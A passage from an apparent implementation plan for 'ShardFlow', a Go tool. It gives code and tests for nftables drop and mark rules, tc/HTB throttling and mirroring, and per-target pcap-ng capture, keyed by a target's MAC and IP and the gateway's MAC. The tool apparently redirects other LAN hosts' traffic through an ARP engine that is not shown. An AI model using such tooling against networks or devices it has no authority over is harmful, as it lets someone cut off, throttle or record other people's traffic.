		"ether", "saddr", gwMAC.String(),
		"ip", "daddr", targetIP.String(),
		"meta", "mark", "set", strconv.FormatUint(uint64(mark), 10),
		"comment", `"` + commentTagFor(targetMAC) + `"`}
}

func commentTagFor(mac net.HardwareAddr) string { return "shardflow:" + mac.String() }

func argvFlushDropTable() []string  { return []string{"flush", "table", dropTableFamily, dropTableName} }
func argvDeleteDropTable() []string { return []string{"delete", "table", dropTableFamily, dropTableName} }
func argvListDropTable() []string   { return []string{"-a", "list", "table", dropTableFamily, dropTableName} }

func argvFlushMarkTable() []string  { return []string{"flush", "table", markTableFamily, markTableName} }
func argvDeleteMarkTable() []string { return []string{"delete", "table", markTableFamily, markTableName} }
func argvListMarkTable() []string   { return []string{"-a", "list", "table", markTableFamily, markTableName} }
```

In `internal/nftmgr/nftmgr.go`:

```go
// Package nftmgr is the typed wrapper around nft(8). Owns two tables:
//   - inet shardflow / forward_chain   — drop rules for the drop policy
//   - netdev shardflow_ingress / ingress — mark rules for throttle and pcap
package nftmgr

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"os/exec"
)

// Runner runs a nft(8) command. Tests substitute a fake.
type Runner interface {
	Run(ctx context.Context, args []string) ([]byte, error)
	// RunScript pipes a multi-line nft script to `nft -f -`. Used for
	// initialisation where we want one atomic transaction containing
	// chain definitions whose curly-brace bodies are awkward to express
	// as a single argv element.
	RunScript(ctx context.Context, script string) ([]byte, error)
}

type execRunner struct{}

func (execRunner) Run(ctx context.Context, args []string) ([]byte, error) {
	cmd := exec.CommandContext(ctx, "nft", args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	if err := cmd.Run(); err != nil {
		return out.Bytes(), fmt.Errorf("nft %v: %w: %s", args, err, out.String())
	}
	return out.Bytes(), nil
}

func (execRunner) RunScript(ctx context.Context, script string) ([]byte, error) {
	cmd := exec.CommandContext(ctx, "nft", "-f", "-")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	cmd.Stdin = bytes.NewBufferString(script)
	if err := cmd.Run(); err != nil {
		return out.Bytes(), fmt.Errorf("nft -f - (script): %w: %s", err, out.String())
	}
	return out.Bytes(), nil
}

// Manager owns the two ShardFlow nft tables. Not safe for concurrent use;
// callers (policycompiler) serialise.
type Manager struct {
	r Runner
}

func New() *Manager                       { return &Manager{r: execRunner{}} }
func NewWithRunner(r Runner) *Manager     { return &Manager{r: r} }

// EnsureTables creates both tables and chains in one atomic nft transaction
// piped via `nft -f -`. Using stdin sidesteps any argv-quoting concerns
// around the curly-brace chain definition bodies.
func (m *Manager) EnsureTables(ctx context.Context, realIface string) error {
	script := fmt.Sprintf(`
add table inet %s
add chain inet %s %s { type filter hook forward priority 0; policy accept; }
add table netdev %s
add chain netdev %s %s { type filter hook ingress device %s priority 0; policy accept; }
`, dropTableName,
		dropTableName, dropChainName,
		markTableName,
		markTableName, markChainName, realIface)
	_, err := m.r.RunScript(ctx, script)
	return err
}

func (m *Manager) AddTargetDrop(ctx context.Context, mac net.HardwareAddr) error {
	_, err := m.r.Run(ctx, argvAddDropRule(mac))
	return err
}

// AddTargetMark inserts the netdev-ingress rule that sets fwmark on frames
// from mac. The same mark is then matched by tc redirect / mirror filters.
// One direction (egress from target) only.
func (m *Manager) AddTargetMark(ctx context.Context, mac net.HardwareAddr, mark uint32) error {
	_, err := m.r.Run(ctx, argvAddMarkRule(mac, mark))
	return err
}

// AddReturnMark adds the second rule for bidirectional policies (pcap):
// matches gateway-sourced frames bound for the target and applies the same
// mark. Both rules share a comment tag for cleanup by RemoveTarget.
func (m *Manager) AddReturnMark(ctx context.Context, mac, gwMAC net.HardwareAddr, targetIP net.IP, mark uint32) error {
	_, err := m.r.Run(ctx, argvAddReturnMarkRule(mac, gwMAC, targetIP, mark))
	return err
}

// RemoveTarget deletes every rule that mentions the given MAC across both
// tables, by parsing handle ids from `nft -a list`. Returns the first
// non-table-missing error so the compiler can keep in-memory state in sync
// with kernel state. List failures with output containing "No such file"
// are tolerated (table just doesn't exist yet); other list errors and any
// delete error surface.
func (m *Manager) RemoveTarget(ctx context.Context, mac net.HardwareAddr) error {
	tables := []struct {
		listArgs             []string
		family, table, chain string
	}{
		{argvListDropTable(), dropTableFamily, dropTableName, dropChainName},
		{argvListMarkTable(), markTableFamily, markTableName, markChainName},
	}
	var firstErr error
	record := func(err error) {
		if err != nil && firstErr == nil {
			firstErr = err
		}
	}
	for _, t := range tables {
		out, err := m.r.Run(ctx, t.listArgs)
		if err != nil {
			if bytes.Contains(out, []byte("No such file")) {
				continue // table not created yet — fine
			}
			record(fmt.Errorf("list %s/%s: %w", t.family, t.table, err))
			continue
		}
		handles := parseRuleHandlesForMAC(out, mac)
		for _, h := range handles {
			_, derr := m.r.Run(ctx, []string{"delete", "rule", t.family, t.table, t.chain, "handle", h})
			record(derr)
		}
	}
	return firstErr
}

func (m *Manager) Teardown(ctx context.Context) error {
	var firstErr error
	for _, args := range [][]string{argvFlushDropTable(), argvDeleteDropTable(), argvFlushMarkTable(), argvDeleteMarkTable()} {
		out, err := m.r.Run(ctx, args)
		if err != nil && firstErr == nil && !nftMissing(out) {
			firstErr = err
		}
	}
	return firstErr
}

// nftMissing returns true when nft output indicates the table being
// flushed/deleted didn't exist — treated as idempotent success.
func nftMissing(out []byte) bool {
	for _, marker := range []string{"No such file or directory", "could not process rule"} {
		if bytes.Contains(out, []byte(marker)) {
			return true
		}
	}
	return false
}

// parseRuleHandlesForMAC is a stub here so the package compiles between
// Step 3 and Step 4. Step 4 replaces it with the real implementation that
// scans `nft -a list` output for `comment "shardflow:<mac>"` tags and
// returns the handle ids of every matching rule.
func parseRuleHandlesForMAC(out []byte, mac net.HardwareAddr) []string {
	_ = out
	_ = mac
	return nil
}
```

- [ ] **Step 4: Implement `parseRuleHandlesForMAC`**

Add the parser in `internal/nftmgr/nftmgr.go`. (`argvListDropTable` and
`argvListMarkTable` already pass `-a` so the output includes `# handle N`
trailers.)

```go
func parseRuleHandlesForMAC(out []byte, mac net.HardwareAddr) []string {
	// nft -a output line examples:
	//   ether saddr aa:bb:cc:dd:ee:01 drop comment "shardflow:aa:bb:cc:dd:ee:01" # handle 7
	tag := "shardflow:" + mac.String()
	var handles []string
	for _, line := range bytes.Split(out, []byte("\n")) {
		s := string(line)
		if !contains(s, tag) || !contains(s, "# handle ") {
			continue
		}
		idx := indexOf(s, "# handle ")
		if idx < 0 {
			continue
		}
		handles = append(handles, fields(s[idx+len("# handle "):])[0])
	}
	return handles
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func fields(s string) []string {
	var out []string
	cur := ""
	for _, r := range s {
		if r == ' ' || r == '\t' || r == '\n' {
			if cur != "" {
				out = append(out, cur)
				cur = ""
			}
			continue
		}
		cur += string(r)
	}
	if cur != "" {
		out = append(out, cur)
	}
	return out
}
```

(Hand-rolled string helpers avoid bringing in `strings` mid-edit; the implementer is welcome to swap them for `strings.Contains`/`strings.Index`/`strings.Fields`.)

- [ ] **Step 5: Add a fake-runner test for `EnsureTable` and `AddTargetDrop`**

Append to `internal/nftmgr/cmd_test.go`:

```go
type fakeRunner struct {
	calls   [][]string
	scripts []string
}

func (f *fakeRunner) Run(_ context.Context, args []string) ([]byte, error) {
	f.calls = append(f.calls, append([]string{}, args...))
	return nil, nil
}

func (f *fakeRunner) RunScript(_ context.Context, s string) ([]byte, error) {
	f.scripts = append(f.scripts, s)
	return nil, nil
}

func TestManagerEnsureTablesPipesAtomicScript(t *testing.T) {
	f := &fakeRunner{}
	m := NewWithRunner(f)
	require.NoError(t, m.EnsureTables(context.Background(), "eth0"))
	require.Len(t, f.scripts, 1)
	s := f.scripts[0]
	assert.Contains(t, s, "add table inet shardflow")
	assert.Contains(t, s, "add table netdev shardflow_ingress")
	assert.Contains(t, s, "device eth0")
}
```

(Add the `import "context"`, `"github.com/stretchr/testify/require"` to the test file.)

- [ ] **Step 6: Run tests, confirm pass**

```bash
go test ./internal/nftmgr/...
```

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add internal/nftmgr/
git commit -m "feat(nftmgr): nftables wrapper around nft(8) shell-out"
```

---

### Task 3.3: `internal/tcmgr` — tc/HTB throttle + ingress redirect/mirror

**Files:**
- Create: `internal/tcmgr/tcmgr.go`
- Create: `internal/tcmgr/cmd.go`
- Create: `internal/tcmgr/cmd_test.go`

The data-plane path:
1. Marked frames arrive on the operator's real iface (nftmgr's netdev-ingress
   chain marks them — see Task 3.2).
2. `tcmgr.EnsureRedirect(realIface)` adds an ingress qdisc on the real iface.
3. For throttle: `tcmgr.RedirectMarkedToIFB(realIface, mark)` installs an
   `fw`-match filter that redirects to `shardflow0` (the IFB iface holding
   the per-target HTB classes).
4. For pcap: `tcmgr.SetCapture(realIface, mark)` installs an `fw`-match filter
   that mirrors marked frames to `shardflow-cap` (a dummy iface that
   `pcapwriter` reads).
5. Throttle and pcap can co-exist on the same target — they install separate
   filters with the same mark.

Owns: `shardflow0` (IFB, throttling), `shardflow-cap` (dummy, capture mirror),
ingress qdisc on the operator's real iface, plus per-target classes/filters.

- [ ] **Step 1: Write failing tests for argv builders**

In `internal/tcmgr/cmd_test.go`:

```go
package tcmgr

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestArgvAddIFB(t *testing.T) {
	assert.Equal(t, []string{"link", "add", "shardflow0", "type", "ifb"}, argvAddIFB("shardflow0"))
}

func TestArgvAddDummy(t *testing.T) {
	assert.Equal(t, []string{"link", "add", "shardflow-cap", "type", "dummy"}, argvAddDummy("shardflow-cap"))
}

func TestArgvSetUpLink(t *testing.T) {
	assert.Equal(t, []string{"link", "set", "shardflow0", "up"}, argvSetUp("shardflow0"))
}

func TestArgvAddIngressQdisc(t *testing.T) {
	got := argvAddIngressQdisc("eth0")
	assert.Equal(t, []string{"qdisc", "add", "dev", "eth0", "handle", "ffff:", "ingress"}, got)
}

func TestArgvAddRedirectFilter(t *testing.T) {
	// Match fw mark, redirect to shardflow0.
	got := argvAddRedirectFilter("eth0", 42, "shardflow0")
	assert.Contains(t, got, "filter")
	assert.Contains(t, got, "fw")
	assert.Contains(t, got, "redirect")
	assert.Contains(t, got, "shardflow0")
}

func TestArgvAddMirrorFilter(t *testing.T) {
	got := argvAddMirrorFilter("eth0", 42, "shardflow-cap")
	assert.Contains(t, got, "mirror")
	assert.Contains(t, got, "shardflow-cap")
}

func TestArgvAddHTBClass(t *testing.T) {
	got := argvAddHTBClass("shardflow0", "1:42", "200kbit")
	assert.Contains(t, got, "class")
	assert.Contains(t, got, "200kbit")
	assert.Contains(t, got, "1:42")
}
```

- [ ] **Step 2: Run, confirm fail**

```bash
go test ./internal/tcmgr/...
```

Expected: FAIL.

- [ ] **Step 3: Implement builders**

In `internal/tcmgr/cmd.go`:

```go
package tcmgr

import "strconv"

func argvAddIFB(name string) []string {
	return []string{"link", "add", name, "type", "ifb"}
}

func argvAddDummy(name string) []string {
	return []string{"link", "add", name, "type", "dummy"}
}

func argvSetUp(name string) []string {
	return []string{"link", "set", name, "up"}
}

func argvDelLink(name string) []string {
	return []string{"link", "del", name}
}

func argvAddRootHTB(iface string) []string {
	return []string{"qdisc", "add", "dev", iface, "root", "handle", "1:", "htb", "default", "ffff"}
}

func argvAddHTBClass(iface, classID, rate string) []string {
	return []string{"class", "add", "dev", iface, "parent", "1:", "classid", classID,
		"htb", "rate", rate, "ceil", rate}
}

func argvDelHTBClass(iface, classID string) []string {
	return []string{"class", "del", "dev", iface, "classid", classID}
}

func argvAddFlowFilterByMark(iface string, mark uint32, classID string) []string {
	return []string{"filter", "add", "dev", iface, "protocol", "all", "parent", "1:",
		"prio", "1", "handle", strconv.FormatUint(uint64(mark), 10), "fw", "flowid", classID}
}

// Ingress qdisc on the real iface — needed before any redirect/mirror
// filter can be attached.
func argvAddIngressQdisc(iface string) []string {
	return []string{"qdisc", "add", "dev", iface, "handle", "ffff:", "ingress"}
}

// Filter that matches fwmark on ingress and redirects matched frames into
// the IFB iface for HTB shaping.
func argvAddRedirectFilter(iface string, mark uint32, ifb string) []string {
	return []string{"filter", "add", "dev", iface, "parent", "ffff:",
		"protocol", "all", "prio", "1",
		"handle", strconv.FormatUint(uint64(mark), 10), "fw",
		"action", "mirred", "egress", "redirect", "dev", ifb}
}

// Filter that matches fwmark on ingress and mirrors matched frames to a
// dummy iface that pcapwriter reads. Mirror (not redirect) so the original
// frame still flows.
func argvAddMirrorFilter(iface string, mark uint32, dummy string) []string {
	return []string{"filter", "add", "dev", iface, "parent", "ffff:",
		"protocol", "all", "prio", "2",
		"handle", strconv.FormatUint(uint64(mark), 10), "fw",
		"action", "mirred", "egress", "mirror", "dev", dummy}
}

// Delete all fw-handle filters for a given mark on the iface ingress.
func argvDelFilterByMark(iface string, mark uint32, prio string) []string {
	return []string{"filter", "del", "dev", iface, "parent", "ffff:",
		"protocol", "all", "prio", prio,
		"handle", strconv.FormatUint(uint64(mark), 10), "fw"}
}

// Delete the IFB-side fw-handle flow filter that maps fwmark → HTB class.
// Used by ClearThrottle so SetThrottle's filter doesn't accumulate on
// shardflow0 across set/clear cycles.
func argvDelFlowFilterByMark(iface string, mark uint32) []string {
	return []string{"filter", "del", "dev", iface, "protocol", "all", "parent", "1:",
		"prio", "1", "handle", strconv.FormatUint(uint64(mark), 10), "fw"}
}
```

- [ ] **Step 4: Implement Manager**

In `internal/tcmgr/tcmgr.go`:

```go
// Package tcmgr wraps tc(8) and ip(8) for ShardFlow's data-plane: the
// shardflow0 IFB iface (throttle), the shardflow-cap dummy iface (capture),
// and the per-real-iface ingress qdisc plus the fw-match filters that
// redirect or mirror marked frames.
package tcmgr

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"strconv"
)

const (
	IFBName     = "shardflow0"
	CaptureName = "shardflow-cap"
)

// Runner abstracts tc/ip invocation for testability.
type Runner interface {
	Run(ctx context.Context, bin string, args []string) ([]byte, error)
}

type execRunner struct{}

func (execRunner) Run(ctx context.Context, bin string, args []string) ([]byte, error) {
	cmd := exec.CommandContext(ctx, bin, args...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	if err := cmd.Run(); err != nil {
		return out.Bytes(), fmt.Errorf("%s %v: %w: %s", bin, args, err, out.String())
	}
	return out.Bytes(), nil
}

// Manager owns the IFB + capture-dummy ifaces and per-target HTB classes.
// Class IDs and fwmarks are not allocated here — policycompiler passes them
// in. The HTB class id is deterministic (`1:<mark>`), so SetThrottle and
// ClearThrottle both derive it from the mark; no per-mac state is kept,
// which means a failed cleanup is fully retryable.
type Manager struct {
	r Runner
}

func New() *Manager {
	return &Manager{r: execRunner{}}
}

func NewWithRunner(r Runner) *Manager {
	return &Manager{r: r}
}

// classIDFor returns the deterministic HTB class id for a given fwmark.
func classIDFor(mark uint32) string {
	return "1:" + strconv.FormatUint(uint64(mark), 10)
}

// EnsureIFB creates shardflow0 (idempotent), sets it up, attaches root HTB.
func (m *Manager) EnsureIFB(ctx context.Context) error {
	_, _ = m.r.Run(ctx, "ip", argvAddIFB(IFBName))
	if _, err := m.r.Run(ctx, "ip", argvSetUp(IFBName)); err != nil {
		return err
	}
	_, _ = m.r.Run(ctx, "tc", argvAddRootHTB(IFBName))
	return nil
}

// EnsureCaptureIface creates shardflow-cap (dummy) and brings it up. The
// pcapwriter reads frames mirrored here.
func (m *Manager) EnsureCaptureIface(ctx context.Context) error {
	_, _ = m.r.Run(ctx, "ip", argvAddDummy(CaptureName))
	_, err := m.r.Run(ctx, "ip", argvSetUp(CaptureName))
	return err
}

// EnsureRedirect installs an ingress qdisc on the operator's real iface so
// later filters have somewhere to attach. Idempotent.
func (m *Manager) EnsureRedirect(ctx context.Context, realIface string) error {
	_, _ = m.r.Run(ctx, "tc", argvAddIngressQdisc(realIface))
	return nil
}

// SetThrottle adds an HTB class for a target at the given rate, plus a flow
// filter on the IFB iface that maps the fwmark to that class, plus a
// redirect filter on the real iface ingress. Caller (the compiler) supplies
// the mark; mark must already be set on the frame by nftmgr's netdev-ingress
// chain.
//
// Atomicity: self-rollbacking. On failure of any step the already-completed
// steps are reversed before returning. No per-mac bookkeeping — class id is
// derived from the mark, so a failed cleanup is fully retryable.
func (m *Manager) SetThrottle(ctx context.Context, realIface, mac, rate string, mark uint32) error {
	classID := classIDFor(mark)
	if _, err := m.r.Run(ctx, "tc", argvAddHTBClass(IFBName, classID, rate)); err != nil {
		return err
	}
	if _, err := m.r.Run(ctx, "tc", argvAddFlowFilterByMark(IFBName, mark, classID)); err != nil {
		_, _ = m.r.Run(ctx, "tc", argvDelHTBClass(IFBName, classID))
		return err
	}
	if _, err := m.r.Run(ctx, "tc", argvAddRedirectFilter(realIface, mark, IFBName)); err != nil {
		_, _ = m.r.Run(ctx, "tc", argvDelFlowFilterByMark(IFBName, mark))
		_, _ = m.r.Run(ctx, "tc", argvDelHTBClass(IFBName, classID))
		return err
	}
	_ = mac // accepted for symmetry with ClearThrottle/diagnostics
	return nil
}

// ClearThrottle removes every tc object SetThrottle added for the target.
// Always runs every step (no in-memory short-circuit) so a failed previous
// cleanup is fully retryable. "Object missing" outputs are tolerated as
// idempotent success.
func (m *Manager) ClearThrottle(ctx context.Context, realIface, mac string, mark uint32) error {
	classID := classIDFor(mark)

	var firstErr error
	record := func(out []byte, err error) {
		if err == nil || isMissing(out) || firstErr != nil {
			return
		}
		firstErr = err
	}
	out, err := m.r.Run(ctx, "tc", argvDelFilterByMark(realIface, mark, "1"))
	record(out, err)
	out, err = m.r.Run(ctx, "tc", argvDelFlowFilterByMark(IFBName, mark))
	record(out, err)
	out, err = m.r.Run(ctx, "tc", argvDelHTBClass(IFBName, classID))
	record(out, err)
	_ = mac
	return firstErr
}

// SetCapture installs a mirror filter on real iface ingress that copies
// marked frames to the shardflow-cap dummy iface.
func (m *Manager) SetCapture(ctx context.Context, realIface string, mark uint32) error {
	_, err := m.r.Run(ctx, "tc", argvAddMirrorFilter(realIface, mark, CaptureName))
	return err
}

func (m *Manager) ClearCapture(ctx context.Context, realIface string, mark uint32) error {
	out, err := m.r.Run(ctx, "tc", argvDelFilterByMark(realIface, mark, "2"))
	if err != nil && !isMissing(out) {
		return err
	}
	return nil
}

// Teardown removes both ShardFlow ifaces. The real iface's ingress qdisc is
// left in place because removing it would also destroy any unrelated tc
// state; per-mark filters were already cleared by ClearThrottle /
// ClearCapture (the daemon's shutdown calls comp.Apply with empty desired
// before this). Returns the first non-missing error encountered.
func (m *Manager) Teardown(ctx context.Context) error {
	var firstErr error
	for _, name := range []string{IFBName, CaptureName} {
		out, err := m.r.Run(ctx, "ip", argvDelLink(name))
		if err != nil && !isMissing(out) && firstErr == nil {
			firstErr = err
		}
	}
	return firstErr
}

// isMissing returns true when iproute2/tc/ip output indicates the object
// being deleted didn't exist — treated as success (idempotent cleanup).
func isMissing(out []byte) bool {
	s := string(out)
	for _, marker := range []string{"Cannot find", "does not exist", "No such file", "RTNETLINK answers: No such"} {
		if bytes.Contains([]byte(s), []byte(marker)) {
			return true
		}
	}
	return false
}
```

- [ ] **Step 5: Run tests, confirm pass**

```bash
go test ./internal/tcmgr/...
```

Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/tcmgr/
git commit -m "feat(tcmgr): tc/HTB throttle wrapper with per-target classes"
```

---

### Task 3.4: `internal/pcapwriter` — per-target rotating pcap writer

**Files:**
- Create: `internal/pcapwriter/pcapwriter.go`
- Create: `internal/pcapwriter/rotate.go`
- Create: `internal/pcapwriter/rotate_test.go`

Reads from a tc-mirrored copy stream (any AF_PACKET source for now — the daemon wires the actual mirror in Phase 5). Per target, writes pcap files with rotation by size and time.

- [ ] **Step 1: Write failing test for the rotation policy**

In `internal/pcapwriter/rotate_test.go`:

```go
package pcapwriter

import (
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
)

func TestShouldRotateBySize(t *testing.T) {
	r := rotation{maxBytes: 100, maxAge: time.Hour, started: time.Now()}
	assert.False(t, r.shouldRotate(50))
	assert.True(t, r.shouldRotate(150))
}

func TestShouldRotateByAge(t *testing.T) {
	r := rotation{maxBytes: 1 << 30, maxAge: time.Second, started: time.Now().Add(-2 * time.Second)}
	assert.True(t, r.shouldRotate(0))
}

func TestNextFilename(t *testing.T) {
	mac := "aa:bb:cc:dd:ee:01"
	tt := time.Date(2026, 5, 6, 12, 4, 11, 123456789, time.UTC)
	got := nextFilename("/var/lib/shardflow/pcap/eng-1", mac, tt)
	assert.Equal(t, "/var/lib/shardflow/pcap/eng-1/aa-bb-cc-dd-ee-01-20260506T120411.123456789Z.pcapng", got)
}

func TestNextFilenameSubSecondRotationsDontCollide(t *testing.T) {
	mac := "aa:bb:cc:dd:ee:01"
	t1 := time.Date(2026, 5, 6, 12, 4, 11, 1, time.UTC)
	t2 := time.Date(2026, 5, 6, 12, 4, 11, 2, time.UTC)
	assert.NotEqual(t, nextFilename("/x", mac, t1), nextFilename("/x", mac, t2))
}
```

- [ ] **Step 2: Run, confirm fail**

```bash
go test ./internal/pcapwriter/...
```

Expected: FAIL.

- [ ] **Step 3: Implement rotation policy**

In `internal/pcapwriter/rotate.go`:

```go
package pcapwriter

import (
	"path/filepath"
	"strings"
	"time"
)

type rotation struct {
	maxBytes int64
	maxAge   time.Duration
	started  time.Time
}

func (r rotation) shouldRotate(bytesWritten int64) bool {
	if bytesWritten >= r.maxBytes {
		return true
	}
	if time.Since(r.started) >= r.maxAge {
		return true
	}
	return false
}

func nextFilename(dir, mac string, when time.Time) string {
	macSafe := strings.ReplaceAll(mac, ":", "-")
	// Format includes nanoseconds (.000000000) so a high-throughput target
	// rotating multiple files within a single second never collides on the
	// previous file. Extension is .pcapng — pcapwriter writes pcap-ng format
	// (per spec §7.3), not classic pcap.
	return filepath.Join(dir, macSafe+"-"+when.UTC().Format("20060102T150405.000000000Z")+".pcapng")
}
```

- [ ] **Step 4: Run tests, confirm pass**

```bash
go test ./internal/pcapwriter/...
```

Expected: PASS.

- [ ] **Step 5: Implement the writer (libpcap source + per-target BPF + pcap-ng output)**

In `internal/pcapwriter/pcapwriter.go`:

```go
// Package pcapwriter writes per-target pcap-ng files from libpcap on the
// shardflow-cap dummy iface, with a per-target BPF filter so concurrent
// pcap policies don't cross-contaminate each other's files. Rotates by
// size or age.
package pcapwriter

import (
	"context"
	"fmt"
	"os"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/pcapgo"
)

// Defaults from spec §11.
const (
	DefaultMaxBytes = 100 * 1024 * 1024 // 100 MB
	DefaultMaxAge   = 15 * time.Minute
)

// Manager owns one pcap writer goroutine per target MAC.
type Manager struct {
	mu      sync.Mutex
	writers map[string]*writer
}

type writer struct {
	mac      string
	dir      string
	cancel   context.CancelFunc
	finished chan struct{}
}

// New returns an empty Manager.
func New() *Manager { return &Manager{writers: map[string]*writer{}} }

// Open starts capturing for mac. Frames are pulled from libpcap on
// srcIface (the shardflow-cap dummy iface fed by tc act_mirred), filtered
// by a per-target BPF expression so concurrent pcap policies don't
// cross-contaminate each other's files, and written to rotating pcap-ng
// files under dir. Open blocks until libpcap is open and the first
// pcap-ng file has been created — an error here means "capture is not
// running"; nil means the policy is durably applied.
//
// Identity must include both the target's MAC (for egress: target→gateway)
// and the target's IP (for return: gateway→target). The two arguments
// together compose the BPF: `ether src <mac> or ip dst <ip>`.
func (m *Manager) Open(mac, ipStr, srcIface, dir string, maxBytes int64, maxAge time.Duration) error {
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return fmt.Errorf("mkdir %s: %w", dir, err)
	}
	if maxBytes == 0 {
		maxBytes = DefaultMaxBytes
	}
	if maxAge == 0 {
		maxAge = DefaultMaxAge
	}
	ctx, cancel := context.WithCancel(context.Background())
	w := &writer{mac: mac, dir: dir, cancel: cancel, finished: make(chan struct{})}

	startup := make(chan error, 1)
	go func() {
		defer close(w.finished)
		_ = runWriter(ctx, mac, ipStr, srcIface, dir, maxBytes, maxAge, startup)
	}()
	if err := <-startup; err != nil {
		cancel()
		<-w.finished
		return err
	}
	m.mu.Lock()
	m.writers[mac] = w
	m.mu.Unlock()
	return nil
}

func (m *Manager) Close(mac string) error {
	m.mu.Lock()
	w, ok := m.writers[mac]
	delete(m.writers, mac)
	m.mu.Unlock()
	if !ok {
		return nil
	}
	w.cancel()
	<-w.finished
	return nil
}

// CloseAll cancels every active writer and waits for its goroutine to
// exit. Called by the daemon on shutdown so pcap-ng buffers are flushed
// rather than truncated when the process exits.
func (m *Manager) CloseAll() error {
	m.mu.Lock()
	macs := make([]string, 0, len(m.writers))
	for mac := range m.writers {
		macs = append(macs, mac)
	}
	m.mu.Unlock()
	for _, mac := range macs {
		_ = m.Close(mac)
	}
	return nil
}

func runWriter(ctx context.Context, mac, ipStr, srcIface, dir string, maxBytes int64, maxAge time.Duration, startup chan<- error) error {
	handle, err := pcap.OpenLive(srcIface, 65536, true, pcap.BlockForever)
	if err != nil {
		startup <- fmt.Errorf("pcap open %s: %w", srcIface, err)
		return err
	}
	defer handle.Close()
	// Per-target BPF: capture egress (frames from target's MAC) AND
	// return direction (frames whose IP destination is the target). This
	// keeps multiple concurrent pcap policies separate even though they
	// all read from the same shardflow-cap dummy iface.
	bpf := fmt.Sprintf("ether src %s or ip dst %s", mac, ipStr)
	if err := handle.SetBPFFilter(bpf); err != nil {
		startup <- fmt.Errorf("bpf %q: %w", bpf, err)
		return err
	}

	open := func() (*os.File, *pcapgo.NgWriter, rotation, error) {
		path := nextFilename(dir, mac, time.Now())
		f, err := os.Create(path)
		if err != nil {
			return nil, nil, rotation{}, err
		}
		w, err := pcapgo.NewNgWriter(f, layers.LinkTypeEthernet)
		if err != nil {
			_ = f.Close()
			return nil, nil, rotation{}, err
		}
		return f, w, rotation{maxBytes: maxBytes, maxAge: maxAge, started: time.Now()}, nil
	}
	f, w, r, err := open()
	if err != nil {
		startup <- err
		return err
	}
	defer f.Close()
	startup <- nil // signal Open() that capture is running

	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	var written int64
	for {
		select {
		case <-ctx.Done():
			_ = w.Flush()
			return nil
		case pkt, ok := <-src.Packets():
			if !ok {
				_ = w.Flush()
				return nil
			}
			data := pkt.Data()
			if r.shouldRotate(written) {
				_ = w.Flush()
				_ = f.Close()
				f, w, r, err = open()
				if err != nil {
					return err
				}
				written = 0
			}
			if err := w.WritePacket(pkt.Metadata().CaptureInfo, data); err != nil {
				return err
			}
			written += int64(len(data))
		}
	}
}
```

- [ ] **Step 6: Add gopacket dependencies**

`gopacket/pcap` and `gopacket/pcapgo` are part of the parent `gopacket` module already added in Phase 2.

```bash
go mod tidy
go test ./internal/pcapwriter/...
```

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add internal/pcapwriter/ go.mod go.sum
git commit -m "feat(pcapwriter): per-target pcap writer with size/age rotation"
```

---

## Phase 4: Orchestration

### Task 4.1: `internal/policycompiler` — desired-state compiler with rollback

**Files:**
- Create: `internal/policycompiler/policy.go`
- Create: `internal/policycompiler/compiler.go`
- Create: `internal/policycompiler/compiler_test.go`

The central abstraction. Inputs: a desired `target → policy` map. Outputs: an ordered sequence of effector calls that takes the system from the current state to the desired state. On any failure, executed steps are rolled back in reverse order.

Effectors are accessed via interfaces so the compiler can be unit-tested with fakes. The order-of-operations rule from spec §7.4 is encoded here.

- [ ] **Step 1: Write failing test for compiling a single drop policy from empty**

In `internal/policycompiler/compiler_test.go`:

```go
package policycompiler

import (
	"context"
	"fmt"
	"net"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/hett-patell/ShardFlow/internal/arpengine"
)

type fakeNFT struct{ calls []string }

func (f *fakeNFT) EnsureTables(_ context.Context, _ string) error { f.calls = append(f.calls, "EnsureTables"); return nil }
func (f *fakeNFT) AddTargetDrop(_ context.Context, mac net.HardwareAddr) error {
	f.calls = append(f.calls, "AddDrop:"+mac.String())
	return nil
}
func (f *fakeNFT) AddTargetMark(_ context.Context, mac net.HardwareAddr, mark uint32) error {
	f.calls = append(f.calls, fmt.Sprintf("AddMark:%s:%d", mac.String(), mark))
	return nil
}
func (f *fakeNFT) AddReturnMark(_ context.Context, mac, gwMAC net.HardwareAddr, targetIP net.IP, mark uint32) error {
	f.calls = append(f.calls, fmt.Sprintf("AddReturnMark:%s:%d", mac.String(), mark))
	return nil
}
func (f *fakeNFT) RemoveTarget(_ context.Context, mac net.HardwareAddr) error {
	f.calls = append(f.calls, "Remove:"+mac.String())
	return nil
}
func (f *fakeNFT) Teardown(_ context.Context) error { f.calls = append(f.calls, "Teardown"); return nil }

type fakeTC struct{ calls []string }

func (f *fakeTC) EnsureIFB(_ context.Context) error          { f.calls = append(f.calls, "EnsureIFB"); return nil }
func (f *fakeTC) EnsureCaptureIface(_ context.Context) error { f.calls = append(f.calls, "EnsureCap"); return nil }
func (f *fakeTC) EnsureRedirect(_ context.Context, _ string) error {
	f.calls = append(f.calls, "EnsureRedirect")
	return nil
}
func (f *fakeTC) SetThrottle(_ context.Context, _, mac, rate string, mark uint32) error {
	f.calls = append(f.calls, fmt.Sprintf("SetThrottle:%s:%s:%d", mac, rate, mark))
	return nil
}
func (f *fakeTC) ClearThrottle(_ context.Context, _, mac string, mark uint32) error {
	f.calls = append(f.calls, fmt.Sprintf("ClearThrottle:%s:%d", mac, mark))
	return nil
}
func (f *fakeTC) SetCapture(_ context.Context, _ string, mark uint32) error {
